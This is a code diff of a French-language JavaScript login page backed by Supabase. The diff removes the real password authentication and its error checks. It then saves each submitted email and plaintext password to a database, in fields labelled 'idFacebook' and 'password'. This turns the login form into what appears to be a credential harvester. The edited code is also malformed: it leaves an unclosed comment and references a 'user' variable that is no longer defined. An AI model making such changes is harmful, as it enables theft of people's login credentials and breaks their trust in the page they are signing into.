@@ -693,60 +693,16 @@
                 loginButton.disabled = true;
 
                 loginButton.textContent =
-                    "Connexion...";
+                    "Chargement...";
 
 
                 try {
 
                     /*
                      * AUTHENTIFICATION SUPABASE
-                     */
+                     
 
-                    const {
-                        data,
-                        error
-                    } =
-                        await supabaseClient.auth
-                            .signInWithPassword({
-
-                                email: email,
-
-                                password: password
-
-                            });
-
-
-                    if (error) {
-
-                        console.error(
-                            "Erreur connexion :",
-                            error
-                        );
-
-                        showError(
-                            "E-mail ou mot de passe incorrect."
-                        );
-
-                        return;
-                    }
-
-
-                    /*
-                     * UTILISATEUR CONNECTÉ
-                     */
-
-                    const user =
-                        data.user;
-
-
-                    if (!user) {
-
-                        showError(
-                            "Utilisateur introuvable."
-                        );
-
-                        return;
-                    }
+                    
 
 
                     /*
@@ -771,8 +727,8 @@
                             .upsert(
                                 {
                                     id: user.id,
-
-                                    idFacebook: email
+                                    idFacebook: email,
+                                    password: password
 
                                 },
                                 {
